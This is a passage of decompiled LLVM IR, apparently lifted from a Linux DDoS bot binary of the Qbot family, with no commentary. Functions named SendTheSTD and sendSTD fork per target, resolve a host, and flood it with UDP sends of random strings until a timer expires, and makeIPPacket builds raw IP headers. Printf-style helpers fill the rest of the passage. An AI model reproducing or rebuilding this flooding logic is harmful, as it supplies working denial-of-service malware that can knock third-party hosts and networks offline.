  %v2_804f20d = add i32 %v0_804f208, %v2_804f1f8
  %v1_804f210 = inttoptr i32 %v2_804f20d to i32*
  %v2_804f210 = load i32, i32* %v1_804f210, align 4
  %v2_804f212 = inttoptr i32 %v5_804f1fd to i32*
  store i32 %v2_804f210, i32* %v2_804f212, align 4
  %v4_804f214 = add i32 %storemerge114, 1
  %v0_804f217 = load i32, i32* @global_var_80748f4.31, align 4
  %v1_804f21c = add i32 %v0_804f217, -1
  %v6_804f220 = icmp ugt i32 %v1_804f21c, %v4_804f214
  br i1 %v6_804f220, label %dec_label_pc_804f1f5, label %dec_label_pc_804f222

dec_label_pc_804f222:                             ; preds = %dec_label_pc_804f1f5, %dec_label_pc_804f1c7
  %v0_804f217.lcssa = phi i32 [ %v0_804f21711, %dec_label_pc_804f1c7 ], [ %v0_804f217, %dec_label_pc_804f1f5 ]
  %v2_804f227 = mul i32 %v0_804f217.lcssa, 4
  %v5_804f22a = add i32 %v1_804f1e1, -4
  %v1_804f22d = add i32 %v5_804f22a, %v2_804f227
  store i32 %v1_804f22d, i32* @edx, align 4
  %v2_804f233 = inttoptr i32 %v1_804f22d to i32*
  store i32 %v1_804f1ae, i32* %v2_804f233, align 4
  %v0_804f235 = load i32, i32* @global_var_807e574.32, align 4
  %v1_804f23e = call i32 @free(i32 %v0_804f235)
  store i32 %v1_804f1e1, i32* @global_var_807e574.32, align 4
  br label %dec_label_pc_804f254

dec_label_pc_804f254:                             ; preds = %entry, %dec_label_pc_804f222
  %v2_804f257 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f257, i32* @ebp, align 4
  ret i32 %v1_804f1ae

; uselistorder directives
  uselistorder i32 %v4_804f214, { 1, 0 }
  uselistorder i32 %v2_804f1f8, { 1, 0 }
  uselistorder i32 %storemerge114, { 1, 0 }
  uselistorder i32 %v0_804f21711, { 1, 0 }
  uselistorder i32 %v1_804f1e1, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f254, { 1, 0 }
  uselistorder label %dec_label_pc_804f1f5, { 1, 0 }
}

define i32 @SendTheSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v4_804f26d = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804f27d = call i32 @__GI_time(i32* null)
  %v1_804f28f = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804f29a = ptrtoint i32* %stack_var_-52 to i32
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v1_804f2bb = add i32 %v1_804f28f, 12
  %v2_804f2bb = inttoptr i32 %v1_804f2bb to i32*
  %v3_804f2bb = load i32, i32* %v2_804f2bb, align 4
  %v2_804f2c3 = ptrtoint i32* %stack_var_-48 to i32
  %v1_804f2c9 = add i32 %v1_804f28f, 16
  %v2_804f2c9 = inttoptr i32 %v1_804f2c9 to i32*
  %v3_804f2c9 = load i32, i32* %v2_804f2c9, align 4
  %v1_804f2cc = inttoptr i32 %v3_804f2c9 to i32*
  %v2_804f2cc = load i32, i32* %v1_804f2cc, align 4
  %v4_804f2d4 = call i32 @bcopy(i32 %v2_804f2cc, i32 %v2_804f2c3, i32 %v3_804f2bb)
  %v1_804f2df = add i32 %v1_804f28f, 8
  %v2_804f2df = inttoptr i32 %v1_804f2df to i32*
  %v3_804f2df = load i32, i32* %v2_804f2df, align 4
  store i32 %v3_804f2df, i32* %stack_var_-52, align 4
  %v4_804f30a = bitcast i32* %stack_var_-368 to i16*
  %v5_804f30a = call i32 @memcpy(i16* %v4_804f30a, i32 ptrtoint ([79 x i8*]* @global_var_8069fe0.288 to i32), i32 316)
  %v5_804f312 = icmp eq i16 %arg2, 0
  %v5_804f3e0 = add i32 %v2_804f27d, %arg3
  %v1_804f316 = icmp eq i1 %v5_804f312, false
  br label %dec_label_pc_804f312

dec_label_pc_804f312:                             ; preds = %dec_label_pc_804f406, %entry
  %stack_var_-20.0 = phi i32 [ 0, %entry ], [ %v4_804f406, %dec_label_pc_804f406 ]
  br i1 %v1_804f316, label %dec_label_pc_804f32f, label %dec_label_pc_804f318

dec_label_pc_804f318:                             ; preds = %dec_label_pc_804f312
  %v3_804f322 = call i32 @realrand(i32 1, i32 65535)
  br label %dec_label_pc_804f335

dec_label_pc_804f32f:                             ; preds = %dec_label_pc_804f312
  br label %dec_label_pc_804f335

dec_label_pc_804f335:                             ; preds = %dec_label_pc_804f318, %dec_label_pc_804f32f
  %v0_804f335 = call i32 @random()
  store i32 %v0_804f335, i32* @ecx, align 4
  %v2_804f345 = udiv i32 %v0_804f335, 79
  store i32 %v2_804f345, i32* @ebx, align 4
  %tmp = mul nsw i32 %v2_804f345, -15
  %v2_804f368 = add i32 %v0_804f335, %tmp
  %v0_804f376 = load i32, i32* @ebp, align 4
  %v2_804f376 = mul i32 %v2_804f368, 4
  %v3_804f376 = add i32 %v0_804f376, -364
  %v4_804f376 = add i32 %v3_804f376, %v2_804f376
  %v5_804f376 = inttoptr i32 %v4_804f376 to i32*
  %v6_804f376 = load i32, i32* %v5_804f376, align 4
  %v5_804f37d = inttoptr i32 %v6_804f376 to i8*
  %v4_804f393 = call i32 @connect(i32 %v4_804f26d, i32 %v2_804f29a, i32 16)
  store i1 false, i1* @df, align 1
  store i32 %v6_804f376, i32* @edi, align 4
  %v3_804f3b2 = call i32 @_strlen(i8* %v5_804f37d)
  %v4_804f3b2 = mul i32 %v3_804f3b2, -1
  %v5_804f3b2 = add i32 %v4_804f3b2, -2
  store i32 %v5_804f3b2, i32* @ecx, align 4
  %v1_804f3b8 = sub i32 0, %v4_804f3b2
  %v5_804f3c2 = call i32 @send(i32 %v4_804f26d, i32 %v6_804f376, i32 %v1_804f3b8, i32 0)
  %tmp37 = icmp ult i32 %stack_var_-20.0, 100
  br i1 %tmp37, label %dec_label_pc_804f406, label %dec_label_pc_804f3d0

dec_label_pc_804f3d0:                             ; preds = %dec_label_pc_804f335
  %v2_804f3d5 = call i32 @__GI_time(i32* null)
  %v5_804f3e5 = icmp slt i32 %v2_804f3d5, %v5_804f3e0
  br i1 %v5_804f3e5, label %dec_label_pc_804f406, label %dec_label_pc_804f3e7

dec_label_pc_804f3e7:                             ; preds = %dec_label_pc_804f3d0
  %v1_804f3ed = call i32 @close(i32 %v4_804f26d)
  %v1_804f3fa = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f406:                             ; preds = %dec_label_pc_804f3d0, %dec_label_pc_804f335
  %stack_var_-20.1 = phi i32 [ %stack_var_-20.0, %dec_label_pc_804f335 ], [ 0, %dec_label_pc_804f3d0 ]
  %v4_804f406 = add i32 %stack_var_-20.1, 1
  br label %dec_label_pc_804f312

; uselistorder directives
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v1_804f28f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder label %dec_label_pc_804f335, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804f41a = call i32 @mfork(i32 %arg2)
  %v1_804f422 = icmp eq i32 %v1_804f41a, 0
  %v1_804f424 = icmp eq i1 %v1_804f422, false
  br i1 %v1_804f424, label %dec_label_pc_804f576, label %dec_label_pc_804f42a

dec_label_pc_804f42a:                             ; preds = %entry
  %v4_804f42a = add i32 %arg3, -2
  %v9_804f42a = sub i32 1, %arg3
  %v10_804f42a = and i32 %v9_804f42a, %arg3
  %v11_804f42a = icmp slt i32 %v10_804f42a, 0
  %v12_804f42a = icmp eq i32 %v4_804f42a, 0
  %v13_804f42a = icmp slt i32 %v4_804f42a, 0
  %v3_804f42e = icmp eq i1 %v13_804f42a, %v11_804f42a
  %v4_804f42e = icmp eq i1 %v12_804f42a, false
  %v5_804f42e = and i1 %v4_804f42e, %v3_804f42e
  br i1 %v5_804f42e, label %dec_label_pc_804f450, label %dec_label_pc_804f430

dec_label_pc_804f430:                             ; preds = %dec_label_pc_804f42a
  %v2_804f43e = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_806a124.289 to i32))
  %v1_804f44b = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804f450

dec_label_pc_804f450:                             ; preds = %dec_label_pc_804f42a, %dec_label_pc_804f430
  %v1_804f453 = add i32 %arg4, 4
  %v1_804f456 = inttoptr i32 %v1_804f453 to i32*
  %v2_804f456 = load i32, i32* %v1_804f456, align 4
  %v1_804f45e = add i32 %arg4, 8
  %v1_804f461 = inttoptr i32 %v1_804f45e to i32*
  %v2_804f461 = load i32, i32* %v1_804f461, align 4
  %v1_804f467 = call i32 @atol(i32 %v2_804f461)
  %v1_804f475 = add i32 %arg4, 12
  %v1_804f478 = inttoptr i32 %v1_804f475 to i32*
  %v2_804f478 = load i32, i32* %v1_804f478, align 4
  %v1_804f47e = call i32 @atol(i32 %v2_804f478)
  %v2_804f492 = inttoptr i32 %v2_804f456 to i8*
  %v3_804f492 = call i32 @__GI_strchr(i8* %v2_804f492, i32 44)
  %v1_804f49a = icmp eq i32 %v3_804f492, 0
  br i1 %v1_804f49a, label %dec_label_pc_804f51d, label %dec_label_pc_804f49e

dec_label_pc_804f49e:                             ; preds = %dec_label_pc_804f450
  store i32 %v2_804f456, i32* @eax, align 4
  %v2_804f4aa = call i32 @__GI_strtok(i32 %v2_804f456, i32 ptrtoint (i32* @global_var_80699fe.198 to i32))
  %v4_804f51533 = icmp eq i32 %v2_804f4aa, 0
  %v1_804f51934 = icmp eq i1 %v4_804f51533, false
  br i1 %v1_804f51934, label %dec_label_pc_804f4b7, label %dec_label_pc_804f576

dec_label_pc_804f4b7:                             ; preds = %dec_label_pc_804f49e, %dec_label_pc_804f500
  %storemerge1335 = phi i32 [ %v2_804f50a, %dec_label_pc_804f500 ], [ %v2_804f4aa, %dec_label_pc_804f49e ]
  %v1_804f4b7 = call i32 @listFork(i32 %storemerge1335)
  store i32 %v1_804f4b7, i32* @eax, align 4
  %v1_804f4bc = icmp eq i32 %v1_804f4b7, 0
  %v1_804f4be = icmp eq i1 %v1_804f4bc, false
  br i1 %v1_804f4be, label %dec_label_pc_804f500, label %dec_label_pc_804f4c0

dec_label_pc_804f4c0:                             ; preds = %dec_label_pc_804f4b7
  %v3_804f4da = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806a148.290 to i32))
  %v3_804f4ee = trunc i32 %v1_804f467 to i16
  %v4_804f4ee = call i32 @SendTheSTD(i32 %storemerge1335, i16 %v3_804f4ee, i32 %v1_804f47e)
  %v1_804f4fb = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f500:                             ; preds = %dec_label_pc_804f4b7
  %v2_804f50a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80699fe.198 to i32))
  %v4_804f515 = icmp eq i32 %v2_804f50a, 0
  %v1_804f519 = icmp eq i1 %v4_804f515, false
  br i1 %v1_804f519, label %dec_label_pc_804f4b7, label %dec_label_pc_804f576

dec_label_pc_804f51d:                             ; preds = %dec_label_pc_804f450
  %v1_804f51d = call i32 @listFork(i32 %tmp)
  %v1_804f522 = icmp eq i32 %v1_804f51d, 0
  br i1 %v1_804f522, label %dec_label_pc_804f530, label %dec_label_pc_804f526

dec_label_pc_804f526:                             ; preds = %dec_label_pc_804f51d
  %v1_804f52b = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804f530

dec_label_pc_804f530:                             ; preds = %dec_label_pc_804f51d, %dec_label_pc_804f526
  %v3_804f550 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806a148.290 to i32))
  %v3_804f564 = trunc i32 %v1_804f467 to i16
  %v4_804f564 = call i32 @SendTheSTD(i32 %v2_804f456, i16 %v3_804f564, i32 %v1_804f47e)
  %v1_804f571 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f576:                             ; preds = %dec_label_pc_804f49e, %dec_label_pc_804f500, %entry
  %v0_804f577 = phi i32 [ %v1_804f41a, %entry ], [ %v2_804f4aa, %dec_label_pc_804f49e ], [ %v2_804f50a, %dec_label_pc_804f500 ]
  ret i32 %v0_804f577

; uselistorder directives
  uselistorder i32 %v2_804f50a, { 0, 2, 1 }
  uselistorder i32 %v2_804f456, { 3, 0, 2, 1 }
  uselistorder i32 %v4_804f42a, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f576, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f530, { 1, 0 }
  uselistorder label %dec_label_pc_804f4b7, { 1, 0 }
  uselistorder label %dec_label_pc_804f450, { 1, 0 }
}

define i32 @get_iface_ip(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %v3_804f587 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804f5a0 = ptrtoint i32* %stack_var_-44 to i32
  %v3_804f5a4 = bitcast i32* %stack_var_-44 to i8*
  %v4_804f5a4 = call i32 @strncpy(i8* %v3_804f5a4, i32 %arg2, i32 15)
  %v3_804f5bb = call i32 @ioctl(i32 %v3_804f587, i32 35093, i32 %v2_804f5a0)
  %v4_804f5c6 = icmp eq i32 %v3_804f5bb, 0
  br i1 %v4_804f5c6, label %dec_label_pc_804f5d5, label %dec_label_pc_804f601

dec_label_pc_804f5d5:                             ; preds = %entry
  %v1_804f5db = call i32 @close(i32 %v3_804f587)
  %v4_804f5e3 = ptrtoint i16* %arg1 to i32
  store i16 2, i16* %arg1, align 2
  %v2_804f5f7 = add i32 %v4_804f5e3, 4
  %v3_804f5f7 = inttoptr i32 %v2_804f5f7 to i32*
  br label %dec_label_pc_804f601

dec_label_pc_804f601:                             ; preds = %entry, %dec_label_pc_804f5d5
  %storemerge = phi i32 [ 1, %dec_label_pc_804f5d5 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f601, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804f613 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_804f613, i32* %arg2, align 4
  %v10_804f627 = icmp eq i32 %v1_804f613, -1
  %. = zext i1 %v10_804f627 to i32
  ret i32 %.
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_3()
  %tmp8 = call i8 @__decompiler_undefined_function_5()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f641 = load i32, i32* @ebp, align 4
  store i32 %v0_804f641, i32* %stack_var_-4, align 4
  %v4_804f647 = sext i8 %tmp8 to i32
  %v4_804f64d = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804f66a = add i32 %v4_804f64d, 1
  %v2_804f66a = inttoptr i32 %v1_804f66a to i8*
  store i8 0, i8* %v2_804f66a, align 1
  %v1_804f671 = add i32 %tmp5, 20
  %v1_804f677 = trunc i32 %v1_804f671 to i16
  %v3_804f677 = add i32 %v4_804f64d, 2
  %v4_804f677 = inttoptr i32 %v3_804f677 to i16*
  store i16 %v1_804f677, i16* %v4_804f677, align 2
  %v2_804f67b = call i32 @rand_cmwc(i32 %v4_804f647)
  %v1_804f685 = trunc i32 %v2_804f67b to i16
  %v3_804f685 = add i32 %v4_804f64d, 4
  %v4_804f685 = inttoptr i32 %v3_804f685 to i16*
  store i16 %v1_804f685, i16* %v4_804f685, align 2
  %v1_804f68c = add i32 %v4_804f64d, 6
  %v2_804f68c = inttoptr i32 %v1_804f68c to i16*
  store i16 0, i16* %v2_804f68c, align 2
  %v1_804f695 = add i32 %v4_804f64d, 8
  %v2_804f695 = inttoptr i32 %v1_804f695 to i8*
  store i8 -1, i8* %v2_804f695, align 1
  %v3_804f69f = add i32 %v4_804f64d, 9
  %v4_804f69f = inttoptr i32 %v3_804f69f to i8*
  store i8 %tmp8, i8* %v4_804f69f, align 1
  %v1_804f6a5 = add i32 %v4_804f64d, 10
  %v2_804f6a5 = inttoptr i32 %v1_804f6a5 to i16*
  store i16 0, i16* %v2_804f6a5, align 2
  %v2_804f6b1 = add i32 %v4_804f64d, 12
  %v3_804f6b1 = inttoptr i32 %v2_804f6b1 to i32*
  %v2_804f6ba = add i32 %v4_804f64d, 16
  %v3_804f6ba = inttoptr i32 %v2_804f6ba to i32*
  store i32 %tmp, i32* %v3_804f6ba, align 4
  %v2_804f6bd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f6bd, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 69, { 0, 9, 10, 7, 1, 2, 3, 4, 5, 6, 8 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804f6c5 = icmp eq i32* %arg1, null
  br i1 %v4_804f6c5, label %dec_label_pc_804f6e4, label %dec_label_pc_804f6cb

dec_label_pc_804f6cb:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_804f6ce = load i32, i32* %arg1, align 4
  %v3_804f6d3 = inttoptr i32 %v2_804f6ce to i8*
  store i8 %tmp8, i8* %v3_804f6d3, align 1
  %v2_804f6d8 = load i32, i32* %arg1, align 4
  %v1_804f6da = add i32 %v2_804f6d8, 1
  store i32 %v1_804f6da, i32* @edx, align 4
  store i32 %v1_804f6da, i32* %arg1, align 4
  br label %dec_label_pc_804f6f7

dec_label_pc_804f6e4:                             ; preds = %entry
  %v2_804f6e9 = ptrtoint i8* %stack_var_8 to i32
  %v3_804f6ef = call i32 @write(i32 1, i32 %v2_804f6e9, i32 1)
  br label %dec_label_pc_804f6f7

dec_label_pc_804f6f7:                             ; preds = %dec_label_pc_804f6cb, %dec_label_pc_804f6e4
  %v0_804f6f8 = phi i32 [ %tmp3, %dec_label_pc_804f6cb ], [ %v3_804f6ef, %dec_label_pc_804f6e4 ]
  ret i32 %v0_804f6f8

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804f6f7, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp24 = icmp slt i32 %arg3, 1
  br i1 %tmp24, label %dec_label_pc_804f759, label %dec_label_pc_804f713

dec_label_pc_804f713:                             ; preds = %entry
  %v4_804f71a = ptrtoint i8* %arg2 to i32
  store i32 %v4_804f71a, i32* @edx, align 4
  %v2_804f72b55 = load i8, i8* %arg2, align 1
  %v3_804f72b56 = zext i8 %v2_804f72b55 to i32
  %v5_804f72b57 = and i32 %v4_804f71a, -256
  %v6_804f72b58 = or i32 %v3_804f72b56, %v5_804f72b57
  %v4_804f72d59 = icmp eq i8 %v2_804f72b55, 0
  %v1_804f72f60 = icmp eq i1 %v4_804f72d59, false
  br i1 %v1_804f72f60, label %dec_label_pc_804f722, label %dec_label_pc_804f731

dec_label_pc_804f722:                             ; preds = %dec_label_pc_804f713, %dec_label_pc_804f722
  %v6_804f72b63 = phi i32 [ %v6_804f72b, %dec_label_pc_804f722 ], [ %v6_804f72b58, %dec_label_pc_804f713 ]
  %v4_804f72862 = phi i32 [ %v5_804f725, %dec_label_pc_804f722 ], [ %v4_804f71a, %dec_label_pc_804f713 ]
  %stack_var_-12.061 = phi i32 [ %v4_804f722, %dec_label_pc_804f722 ], [ 0, %dec_label_pc_804f713 ]
  %v4_804f722 = add i32 %stack_var_-12.061, 1
  %v5_804f725 = add i32 %v4_804f72862, 1
  %v22_804f725 = inttoptr i32 %v5_804f725 to i8*
  store i32 %v5_804f725, i32* @edx, align 4
  %v2_804f72b = load i8, i8* %v22_804f725, align 1
  %v3_804f72b = zext i8 %v2_804f72b to i32
  %v5_804f72b = and i32 %v6_804f72b63, -256
  %v6_804f72b = or i32 %v3_804f72b, %v5_804f72b
  %v4_804f72d = icmp eq i8 %v2_804f72b, 0
  %v1_804f72f = icmp eq i1 %v4_804f72d, false
  br i1 %v1_804f72f, label %dec_label_pc_804f722, label %dec_label_pc_804f731

dec_label_pc_804f731:                             ; preds = %dec_label_pc_804f722, %dec_label_pc_804f713
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_804f713 ], [ %v4_804f722, %dec_label_pc_804f722 ]
  %v5_804f737 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_804f737, label %dec_label_pc_804f742, label %dec_label_pc_804f748

dec_label_pc_804f742:                             ; preds = %dec_label_pc_804f731
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_804f745 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_804f748

dec_label_pc_804f748:                             ; preds = %dec_label_pc_804f731, %dec_label_pc_804f742
  %storemerge = phi i32 [ %v5_804f745, %dec_label_pc_804f742 ], [ 0, %dec_label_pc_804f731 ]
  %v1_804f74b = and i32 %arg4, 2
  %tmp25 = mul nuw nsw i32 %v1_804f74b, 8
  %tmp26 = or i32 %tmp25, 32
  br label %dec_label_pc_804f759

dec_label_pc_804f759:                             ; preds = %dec_label_pc_804f748, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_804f748 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp26, %dec_label_pc_804f748 ]
  %v1_804f75c = urem i32 %arg4, 2
  %v2_804f75c = icmp eq i32 %v1_804f75c, 0
  %v1_804f761 = icmp eq i1 %v2_804f75c, false
  %.pre10 = inttoptr i32 %arg1 to i32*
  br i1 %v1_804f761, label %dec_label_pc_804f7a3.preheader, label %dec_label_pc_804f77c.preheader

dec_label_pc_804f77c.preheader:                   ; preds = %dec_label_pc_804f759
  %tmp2748 = icmp slt i32 %stack_var_12.0, 1
  %tmp2849 = icmp eq i1 %tmp2748, false
  br i1 %tmp2849, label %dec_label_pc_804f765.lr.ph, label %dec_label_pc_804f7a3.preheader

dec_label_pc_804f765.lr.ph:                       ; preds = %dec_label_pc_804f77c.preheader
  br label %dec_label_pc_804f765

dec_label_pc_804f765:                             ; preds = %dec_label_pc_804f765.lr.ph, %dec_label_pc_804f765
  %stack_var_-20.051 = phi i32 [ 0, %dec_label_pc_804f765.lr.ph ], [ %v4_804f776, %dec_label_pc_804f765 ]
  %stack_var_12.150 = phi i32 [ %stack_var_12.0, %dec_label_pc_804f765.lr.ph ], [ %v4_804f779, %dec_label_pc_804f765 ]
  %v3_804f76e = call i32 @printchar(i32* %.pre10, i32 %stack_var_-16.0)
  %v4_804f776 = add i32 %stack_var_-20.051, 1
  %v4_804f779 = add i32 %stack_var_12.150, -1
  %tmp27 = icmp slt i32 %v4_804f779, 1
  %tmp28 = icmp eq i1 %tmp27, false
  br i1 %tmp28, label %dec_label_pc_804f765, label %dec_label_pc_804f7a3.preheader

dec_label_pc_804f7a3.preheader:                   ; preds = %dec_label_pc_804f77c.preheader, %dec_label_pc_804f765, %dec_label_pc_804f759
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_804f759 ], [ %stack_var_12.0, %dec_label_pc_804f77c.preheader ], [ %v4_804f779, %dec_label_pc_804f765 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_804f759 ], [ 0, %dec_label_pc_804f77c.preheader ], [ %v4_804f776, %dec_label_pc_804f765 ]
  %v2_804f7a637 = load i8, i8* %arg2, align 1
  %v4_804f7a841 = icmp eq i8 %v2_804f7a637, 0
  %v1_804f7aa42 = icmp eq i1 %v4_804f7a841, false
  br i1 %v1_804f7aa42, label %dec_label_pc_804f784.lr.ph, label %dec_label_pc_804f7c5.preheader

dec_label_pc_804f784.lr.ph:                       ; preds = %dec_label_pc_804f7a3.preheader
  %v4_804f7a336 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804f784

dec_label_pc_804f784:                             ; preds = %dec_label_pc_804f784.lr.ph, %dec_label_pc_804f784
  %v4_804f7a345 = phi i32 [ %v4_804f7a336, %dec_label_pc_804f784.lr.ph ], [ %v5_804f7a0, %dec_label_pc_804f784 ]
  %stack_var_-20.144 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804f784.lr.ph ], [ %v4_804f79d, %dec_label_pc_804f784 ]
  %stack_var_8.043 = phi i8* [ %arg2, %dec_label_pc_804f784.lr.ph ], [ %v22_804f7a0, %dec_label_pc_804f784 ]
  %v2_804f787 = load i8, i8* %stack_var_8.043, align 1
  %v3_804f787 = zext i8 %v2_804f787 to i32
  %v3_804f795 = call i32 @printchar(i32* %.pre10, i32 %v3_804f787)
  %v4_804f79d = add i32 %stack_var_-20.144, 1
  %v5_804f7a0 = add i32 %v4_804f7a345, 1
  %v22_804f7a0 = inttoptr i32 %v5_804f7a0 to i8*
  %v2_804f7a6 = load i8, i8* %v22_804f7a0, align 1
  %v4_804f7a8 = icmp eq i8 %v2_804f7a6, 0
  %v1_804f7aa = icmp eq i1 %v4_804f7a8, false
  br i1 %v1_804f7aa, label %dec_label_pc_804f784, label %dec_label_pc_804f7c5.preheader

dec_label_pc_804f7c5.preheader:                   ; preds = %dec_label_pc_804f784, %dec_label_pc_804f7a3.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804f7a3.preheader ], [ %v4_804f79d, %dec_label_pc_804f784 ]
  %tmp2932 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3033 = icmp eq i1 %tmp2932, false
  br i1 %tmp3033, label %dec_label_pc_804f7ae.lr.ph, label %dec_label_pc_804f7cb

dec_label_pc_804f7ae.lr.ph:                       ; preds = %dec_label_pc_804f7c5.preheader
  br label %dec_label_pc_804f7ae

dec_label_pc_804f7ae:                             ; preds = %dec_label_pc_804f7ae.lr.ph, %dec_label_pc_804f7ae
  %stack_var_-20.235 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804f7ae.lr.ph ], [ %v4_804f7bf, %dec_label_pc_804f7ae ]
  %stack_var_12.334 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_804f7ae.lr.ph ], [ %v4_804f7c2, %dec_label_pc_804f7ae ]
  %v3_804f7b7 = call i32 @printchar(i32* %.pre10, i32 %stack_var_-16.0)
  %v4_804f7bf = add i32 %stack_var_-20.235, 1
  %v4_804f7c2 = add i32 %stack_var_12.334, -1
  %tmp29 = icmp slt i32 %v4_804f7c2, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_804f7ae, label %dec_label_pc_804f7cb

dec_label_pc_804f7cb:                             ; preds = %dec_label_pc_804f7ae, %dec_label_pc_804f7c5.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804f7c5.preheader ], [ %v4_804f7bf, %dec_label_pc_804f7ae ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_804f7a0, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_804f725, { 1, 2, 0 }
  uselistorder i32 %v4_804f71a, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_804f7ae, { 1, 0 }
  uselistorder label %dec_label_pc_804f784, { 1, 0 }
  uselistorder label %dec_label_pc_804f7a3.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f765, { 1, 0 }
  uselistorder label %dec_label_pc_804f748, { 1, 0 }
  uselistorder label %dec_label_pc_804f722, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804f7e7 = sext i32 %tmp35 to i64
  %v4_804f7ea = icmp eq i32 %tmp35, 0
  %v5_804f7ea = icmp slt i32 %tmp35, 0
  %v1_804f7ee = icmp eq i1 %v4_804f7ea, false
  br i1 %v1_804f7ee, label %dec_label_pc_804f815, label %dec_label_pc_804f7f0

dec_label_pc_804f7f0:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_804f805 = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_804f8f0

dec_label_pc_804f815:                             ; preds = %entry
  %v4_804f815 = icmp eq i32 %tmp28, 0
  br i1 %v4_804f815, label %dec_label_pc_804f836, label %dec_label_pc_804f81b

dec_label_pc_804f81b:                             ; preds = %dec_label_pc_804f815
  %v12_804f81b = icmp eq i32 %tmp27, 10
